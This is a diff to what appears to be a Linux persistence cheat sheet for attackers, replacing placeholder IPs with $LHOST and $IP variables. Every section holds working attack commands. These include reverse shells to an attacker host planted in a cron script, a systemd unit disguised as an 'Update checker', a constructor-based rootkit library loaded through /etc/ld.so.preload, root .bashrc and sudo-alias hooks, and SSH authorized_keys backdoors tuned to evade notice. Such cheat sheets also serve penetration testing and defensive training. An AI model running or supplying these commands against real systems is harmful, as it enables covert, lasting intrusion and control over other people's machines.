@@ -19,7 +19,7 @@ grep "CRON" /var/log/syslog
 ### Inject Reverse Shell into Writable Cron Job
 
 ```bash
-echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /home/user/backup.sh
+echo "bash -i >& /dev/tcp/$LHOST/4444 0>&1" >> /home/user/backup.sh
 nc -lvnp 4444
 ```
 
@@ -30,7 +30,7 @@ nc -lvnp 4444
 ```bash
 ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistent_key
 echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
-ssh -i persistent_key <user>@10.10.10.10
+ssh -i persistent_key <user>@$IP
 ```
 
 ---
@@ -46,7 +46,7 @@ ssh -i persistent_key <user>@10.10.10.10
 
     [Service]
     Type=simple
-    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
+    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'
     Restart=always
     RestartSec=60
 
@@ -73,7 +73,7 @@ Description=Update checker
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'
 Restart=always
 
 [Install]
@@ -96,7 +96,7 @@ cat > /tmp/rk.c <<'EOF'
 #include <stdio.h>
 #include <stdlib.h>
 __attribute__((constructor)) void init(){
-    if(getuid()==0) system("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1 &'");
+    if(getuid()==0) system("bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1 &'");
 }
 EOF
 gcc -fPIC -shared -nostartfiles /tmp/rk.c -o /lib/x86_64-linux-gnu/libudev.so.9
@@ -113,13 +113,13 @@ echo /lib/x86_64-linux-gnu/libudev.so.9 > /etc/ld.so.preload
 Lock the backdoor to your attacker IP so it blends better and doesn't grant random scanners access:
 
 ```bash
-echo 'from="203.0.113.5" ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
+echo 'from="$LHOST" ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
 ```
 
 Also consider `command=`:
 
 ```bash
-echo 'command="/bin/bash",from="203.0.113.5" ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
+echo 'command="/bin/bash",from="$LHOST" ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
 ```
 
 ---
@@ -128,11 +128,11 @@ echo 'command="/bin/bash",from="203.0.113.5" ssh-rsa AAAA...' >> /root/.ssh/auth
 
 ```bash
 # Runs every time the user starts an interactive shell
-echo 'bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" &' >> /root/.bashrc
+echo 'bash -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1" &' >> /root/.bashrc
 ```
 
 Lower-footprint alternative, only fires when a specific command is run:
 
 ```bash
-echo 'alias sudo="bash -c \"bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\" &; /usr/bin/sudo"' >> /root/.bashrc
+echo 'alias sudo="bash -c \"bash -i >& /dev/tcp/$LHOST/4444 0>&1\" &; /usr/bin/sudo"' >> /root/.bashrc
 ```
